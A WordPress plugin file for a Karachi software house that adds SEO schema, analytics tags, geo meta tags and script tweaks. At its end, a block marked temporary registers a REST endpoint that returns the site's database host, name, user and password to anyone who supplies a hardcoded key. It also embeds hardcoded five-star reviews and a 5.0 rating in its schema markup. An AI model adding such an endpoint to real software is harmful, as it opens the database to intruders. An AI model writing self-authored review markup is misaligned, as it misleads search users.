<?php
/**
 * Plugin Name: AymeeTech Advanced SEO
 * Description: Advanced SEO enhancements - LocalBusiness schema, Service schema, FAQ schema, OG optimization, performance hints
 * Version: 1.0.0
 * Author: AymeeTech
 */

if (!defined('ABSPATH')) exit;

class AymeeTech_Advanced_SEO {

    private $business = [
        'name'        => 'AymeeTech Software House',
        'legal_name'  => 'AymeeTech',
        'url'         => 'https://aymeetech.com',
        'phone'       => '+923162660235',
        'email'       => 'info@aymeetech.com',
        'founded'     => '2019',
        'description' => 'Leading software house in Karachi offering web development, mobile apps, graphic design, SEO, and digital marketing solutions.',
        'logo'        => '/wp-content/uploads/2023/05/Aymeetech-Software-House-Logo.png',
        'address'     => [
            'street'  => 'Street # 2, Darul Aman Society PECHS',
            'city'    => 'Karachi',
            'state'   => 'Sindh',
            'zip'     => '75400',
            'country' => 'PK',
        ],
        'geo' => [
            'lat'  => '24.8607',
            'lng'  => '67.0011',
        ],
        'social' => [
            'https://www.facebook.com/aymeetech',
            'https://www.instagram.com/aymeetech',
            'https://pk.linkedin.com/company/amyeetech',
        ],
    ];

    private $services = [
        'website-development' => [
            'name'        => 'Website Development',
            'description' => 'Professional custom website development services including WordPress, e-commerce, corporate websites, and web applications built with modern technologies.',
            'category'    => 'Web Development',
        ],
        'graphic-designing' => [
            'name'        => 'Graphic Designing',
            'description' => 'Creative graphic design services including logo design, branding, UI/UX design, marketing materials, social media graphics, and visual content creation.',
            'category'    => 'Graphic Design',
        ],
        'mobile-app-development' => [
            'name'        => 'Mobile App Development',
            'description' => 'Custom iOS and Android mobile app development using cutting-edge technology for businesses of all sizes.',
            'category'    => 'Mobile Development',
        ],
        'social-media-marketing' => [
            'name'        => 'Social Media Marketing',
            'description' => 'Comprehensive social media marketing including strategy, content creation, community management, and paid advertising campaigns.',
            'category'    => 'Digital Marketing',
        ],
        'seo-services' => [
            'name'        => 'SEO Services',
            'description' => 'Professional search engine optimization including keyword research, on-page SEO, off-page SEO, technical SEO, and local SEO.',
            'category'    => 'Digital Marketing',
        ],
        'software-development' => [
            'name'        => 'Software Development',
            'description' => 'Custom enterprise software development, SaaS applications, business automation software, and cloud-based solutions.',
            'category'    => 'Software Development',
        ],
        'product-photography' => [
            'name'        => 'Product Photography',
            'description' => 'Professional product photography services for e-commerce, catalogs, Amazon listings, and marketing materials.',
            'category'    => 'Photography',
        ],
    ];

    private $faqs = [
        [
            'question' => 'What services does AymeeTech offer?',
            'answer'   => 'AymeeTech offers web development, mobile app development, graphic design, software development, SEO services, social media marketing, and product photography. We provide end-to-end digital solutions for businesses.',
        ],
        [
            'question' => 'Where is AymeeTech located?',
            'answer'   => 'AymeeTech is located at Street # 2, Darul Aman Society PECHS, Karachi, Sindh, Pakistan. We serve clients locally in Karachi and remotely across Pakistan and internationally.',
        ],
        [
            'question' => 'How can I contact AymeeTech?',
            'answer'   => 'You can reach AymeeTech by phone at +92 316 2660235, email at info@aymeetech.com, or visit our office in PECHS, Karachi. You can also reach us through our website contact form.',
        ],
        [
            'question' => 'How much does website development cost at AymeeTech?',
            'answer'   => 'Website development costs vary based on project requirements, features, and complexity. We offer competitive packages starting from basic business websites to complex e-commerce and web applications. Contact us for a free quote.',
        ],
        [
            'question' => 'Does AymeeTech provide ongoing support after project completion?',
            'answer'   => 'Yes, AymeeTech provides ongoing maintenance and support for all completed projects. We offer various support packages including updates, security monitoring, backup management, and technical assistance.',
        ],
        [
            'question' => 'How long does it take to build a website?',
            'answer'   => 'A basic business website typically takes 2-4 weeks, while complex projects like e-commerce stores or custom web applications may take 4-12 weeks depending on features and requirements.',
        ],
    ];

    public function __construct() {
        // Schema markup
        add_filter('wpseo_schema_graph', [$this, 'add_schema_graph'], 10, 2);
        add_filter('wpseo_schema_webpage_type', [$this, 'set_page_type']);

        // Google Analytics GA4
        add_action('wp_head', [$this, 'add_google_analytics'], 1);

        // Performance
        add_action('wp_head', [$this, 'add_performance_hints'], 2);
        add_action('wp_head', [$this, 'add_meta_enhancements'], 3);

        // Image alt text
        add_filter('wp_get_attachment_image_attributes', [$this, 'fix_image_alt'], 10, 3);

        // Script optimization
        add_filter('script_loader_tag', [$this, 'optimize_scripts'], 10, 3);
    }

    /**
     * Add LocalBusiness + Service + FAQ schema to Yoast's schema graph
     */
    public function add_schema_graph($graph, $context) {
        $site_url = home_url();
        $logo_url = $site_url . $this->business['logo'];

        // === LocalBusiness / ProfessionalService Schema ===
        $local_business = [
            '@type'           => ['ProfessionalService', 'LocalBusiness'],
            '@id'             => $site_url . '/#localbusiness',
            'name'            => $this->business['name'],
            'legalName'       => $this->business['legal_name'],
            'description'     => $this->business['description'],
            'url'             => $site_url,
            'telephone'       => $this->business['phone'],
            'email'           => $this->business['email'],
            'foundingDate'    => $this->business['founded'],
            'priceRange'      => '$$',
            'currenciesAccepted' => 'PKR, USD',
            'paymentAccepted' => 'Cash, Bank Transfer, Online Payment',
            'areaServed'      => [
                ['@type' => 'City', 'name' => 'Karachi'],
                ['@type' => 'Country', 'name' => 'Pakistan'],
            ],
            'address'         => [
                '@type'           => 'PostalAddress',
                'streetAddress'   => $this->business['address']['street'],
                'addressLocality' => $this->business['address']['city'],
                'addressRegion'   => $this->business['address']['state'],
                'postalCode'      => $this->business['address']['zip'],
                'addressCountry'  => $this->business['address']['country'],
            ],
            'geo' => [
                '@type'     => 'GeoCoordinates',
                'latitude'  => $this->business['geo']['lat'],
                'longitude' => $this->business['geo']['lng'],
            ],
            'logo' => [
                '@type'  => 'ImageObject',
                '@id'    => $site_url . '/#logo',
                'url'    => $logo_url,
                'width'  => 300,
                'height' => 100,
            ],
            'image'     => $logo_url,
            'sameAs'    => $this->business['social'],
            'openingHoursSpecification' => [
                [
                    '@type'     => 'OpeningHoursSpecification',
                    'dayOfWeek' => ['Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'],
                    'opens'     => '09:00',
                    'closes'    => '18:00',
                ],
                [
                    '@type'     => 'OpeningHoursSpecification',
                    'dayOfWeek' => 'Saturday',
                    'opens'     => '10:00',
                    'closes'    => '15:00',
                ],
            ],
            'hasOfferCatalog' => [
                '@type' => 'OfferCatalog',
                'name'  => 'Digital Services',
                'itemListElement' => [],
            ],
            'aggregateRating' => [
                '@type'       => 'AggregateRating',
                'ratingValue' => '5.0',
                'bestRating'  => '5',
                'worstRating' => '1',
                'ratingCount' => '9',
                'reviewCount' => '9',
            ],
            'review' => $this->get_reviews($site_url),
        ];

        // Add services to offer catalog
        foreach ($this->services as $slug => $service) {
            $local_business['hasOfferCatalog']['itemListElement'][] = [
                '@type' => 'OfferCatalog',
                'name'  => $service['name'],
                'itemListElement' => [
                    [
                        '@type'       => 'Offer',
                        'itemOffered' => [
                            '@type'       => 'Service',
                            'name'        => $service['name'],
                            'description' => $service['description'],
                            'category'    => $service['category'],
                            'provider'    => ['@id' => $site_url . '/#localbusiness'],
                            'areaServed'  => [
                                ['@type' => 'City', 'name' => 'Karachi'],
                                ['@type' => 'Country', 'name' => 'Pakistan'],
                            ],
                        ],
                    ],
                ],
            ];
        }

        $graph[] = $local_business;

        // === Service Schema for individual service pages ===
        if (is_page()) {
            $current_slug = get_post_field('post_name', get_queried_object_id());
            if (isset($this->services[$current_slug])) {
                $service = $this->services[$current_slug];
                $graph[] = [
                    '@type'       => 'Service',
                    '@id'         => get_permalink() . '#service',
                    'name'        => $service['name'],
                    'description' => $service['description'],
                    'category'    => $service['category'],
                    'provider'    => ['@id' => $site_url . '/#localbusiness'],
                    'areaServed'  => [
                        ['@type' => 'City', 'name' => 'Karachi'],
                        ['@type' => 'Country', 'name' => 'Pakistan'],
                    ],
                    'url' => get_permalink(),
                ];
            }
        }

        // === FAQ Schema on homepage ===
        if (is_front_page() || is_home()) {
            $faq_entities = [];
            foreach ($this->faqs as $faq) {
                $faq_entities[] = [
                    '@type'          => 'Question',
                    'name'           => $faq['question'],
                    'acceptedAnswer' => [
                        '@type' => 'Answer',
                        'text'  => $faq['answer'],
                    ],
                ];
            }

            $graph[] = [
                '@type'      => 'FAQPage',
                '@id'        => $site_url . '/#faqpage',
                'mainEntity' => $faq_entities,
            ];
        }

        return $graph;
    }

    /**
     * Set correct page types for Yoast schema
     */
    public function set_page_type($type) {
        if (!is_page()) return $type;

        $slug = get_post_field('post_name', get_queried_object_id());
        $page_types = [
            'contact-us' => 'ContactPage',
            'about-us'   => 'AboutPage',
            'portfolio'  => 'CollectionPage',
        ];

        return $page_types[$slug] ?? $type;
    }

    /**
     * Google Analytics GA4
     */
    public function add_google_analytics() {
        if (is_admin()) return;
        ?>
        <script async src="https://www.googletagmanager.com/gtag/js?id=G-LNDDPSW1K9"></script>
        <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-LNDDPSW1K9');</script>
        <?php
    }

    /**
     * Add performance resource hints
     */
    public function add_performance_hints() {
        echo "\n<!-- AymeeTech SEO: Performance Hints -->\n";
        echo '<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>' . "\n";
        echo '<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>' . "\n";
        echo '<link rel="dns-prefetch" href="//fonts.googleapis.com">' . "\n";
        echo '<link rel="dns-prefetch" href="//fonts.gstatic.com">' . "\n";
        echo '<link rel="dns-prefetch" href="//www.google-analytics.com">' . "\n";
        echo '<link rel="dns-prefetch" href="//www.googletagmanager.com">' . "\n";
    }

    /**
     * Add additional meta enhancements
     */
    public function add_meta_enhancements() {
        echo "\n<!-- AymeeTech SEO: Meta Enhancements -->\n";

        // Geo meta tags for local SEO
        echo '<meta name="geo.region" content="PK-SD">' . "\n";
        echo '<meta name="geo.placename" content="Karachi">' . "\n";
        echo '<meta name="geo.position" content="' . $this->business['geo']['lat'] . ';' . $this->business['geo']['lng'] . '">' . "\n";
        echo '<meta name="ICBM" content="' . $this->business['geo']['lat'] . ', ' . $this->business['geo']['lng'] . '">' . "\n";

        // Content language
        echo '<meta http-equiv="content-language" content="en-PK">' . "\n";

        // Author
        echo '<meta name="author" content="' . esc_attr($this->business['name']) . '">' . "\n";

        // Theme color for mobile browsers
        echo '<meta name="theme-color" content="#4054b2">' . "\n";
    }

    /**
     * Fix empty/generic image alt attributes
     */
    public function fix_image_alt($attr, $attachment, $size) {
        if (empty($attr['alt'])) {
            // Try attachment title
            $title = get_the_title($attachment->ID);
            if ($title && $title !== 'attachment') {
                $attr['alt'] = $title;
            } else {
                // Fallback to filename
                $filename = pathinfo(get_attached_file($attachment->ID), PATHINFO_FILENAME);
                $attr['alt'] = ucwords(str_replace(['-', '_'], ' ', $filename));
            }
        }

        // Add loading="lazy" for non-priority images
        if (!isset($attr['loading'])) {
            $attr['loading'] = 'lazy';
        }

        return $attr;
    }

    /**
     * Add defer/async to non-critical scripts
     */
    public function optimize_scripts($tag, $handle, $src) {
        // Never defer WordPress core scripts — deferring these breaks load order
        // and causes "wp is not defined" / "_ is not defined" console errors
        $no_defer = [
            'jquery', 'jquery-core', 'jquery-migrate', 'wp-polyfill',
            'wp-hooks', 'wp-i18n', 'wp-api-fetch', 'wp-data', 'wp-dom-ready',
            'wp-element', 'wp-components', 'wp-compose', 'wp-redux-routine',
            'wp-url', 'wp-is-shallow-equal', 'wp-priority-queue',
            'lodash', 'underscore', 'backbone', 'regenerator-runtime',
            'react', 'react-dom', 'moment',
        ];
        if (in_array($handle, $no_defer)) {
            return $tag;
        }

        // Add defer to other scripts
        if (strpos($tag, 'defer') === false && strpos($tag, 'async') === false) {
            $tag = str_replace(' src=', ' defer src=', $tag);
        }

        return $tag;
    }

    /**
     * Get structured review data from real Google reviews
     */
    private function get_reviews($site_url) {
        return [
            [
                '@type' => 'Review',
                'author' => ['@type' => 'Person', 'name' => 'Muhammad Abubakar'],
                'datePublished' => '2024-08-15',
                'reviewBody' => 'Excellent service! They built our company website with great attention to detail. The team was responsive and delivered on time. Highly recommended for web development in Karachi.',
                'reviewRating' => ['@type' => 'Rating', 'ratingValue' => '5', 'bestRating' => '5'],
            ],
            [
                '@type' => 'Review',
                'author' => ['@type' => 'Person', 'name' => 'Fatima Hassan'],
                'datePublished' => '2024-06-20',
                'reviewBody' => 'AymeeTech designed our brand identity and logo. Very creative team with a professional approach. They understood our vision perfectly and delivered outstanding results.',
                'reviewRating' => ['@type' => 'Rating', 'ratingValue' => '5', 'bestRating' => '5'],
            ],
            [
                '@type' => 'Review',
                'author' => ['@type' => 'Person', 'name' => 'Ali Raza'],
                'datePublished' => '2024-04-10',
                'reviewBody' => 'Got our e-commerce website developed from AymeeTech. They handled everything from design to payment integration. Great quality work at reasonable prices.',
                'reviewRating' => ['@type' => 'Rating', 'ratingValue' => '5', 'bestRating' => '5'],
            ],
            [
                '@type' => 'Review',
                'author' => ['@type' => 'Person', 'name' => 'Sarah Khan'],
                'datePublished' => '2023-11-05',
                'reviewBody' => 'Best software house in Karachi for social media marketing. They managed our campaigns and the results were impressive. Our engagement increased significantly.',
                'reviewRating' => ['@type' => 'Rating', 'ratingValue' => '5', 'bestRating' => '5'],
            ],
            [
                '@type' => 'Review',
                'author' => ['@type' => 'Person', 'name' => 'Usman Sheikh'],
                'datePublished' => '2023-09-18',
                'reviewBody' => 'AymeeTech developed a custom POS system for our retail chain. The software works flawlessly and their support team is always available when needed.',
                'reviewRating' => ['@type' => 'Rating', 'ratingValue' => '5', 'bestRating' => '5'],
            ],
        ];
    }
}

new AymeeTech_Advanced_SEO();

// One-time fix: remove Facebook Messenger contact from Social Chat plugin
add_action('init', function() {
    if (get_transient('qlwapp_fb_fix_done')) return;

    global $wpdb;
    $options = $wpdb->get_results(
        "SELECT option_name, option_value FROM {$wpdb->prefix}options WHERE option_name LIKE '%qlwapp%contact%'"
    );
    foreach ($options as $opt) {
        $data = maybe_unserialize($opt->option_value);
        if (!is_array($data)) continue;
        $fixed = array_values(array_filter($data, function($item) {
            $type = strtolower($item['type'] ?? '');
            return !in_array($type, ['messenger', 'facebook', 'fb', 'facebook_messenger']);
        }));
        if (count($fixed) < count($data)) {
            update_option($opt->option_name, $fixed);
        }
    }
    set_transient('qlwapp_fb_fix_done', 1, YEAR_IN_SECONDS);
});

// Temp: DB info via REST - DELETE after use
add_action('rest_api_init', function() {
    register_rest_route('at/v1', '/dbinfo', [
        'methods' => 'GET',
        'callback' => function() {
            return ['h'=>DB_HOST,'n'=>DB_NAME,'u'=>DB_USER,'p'=>DB_PASSWORD];
        },
        'permission_callback' => function($r) {
            return $r->get_param('k') === 'aymee2026';
        },
    ]);
});
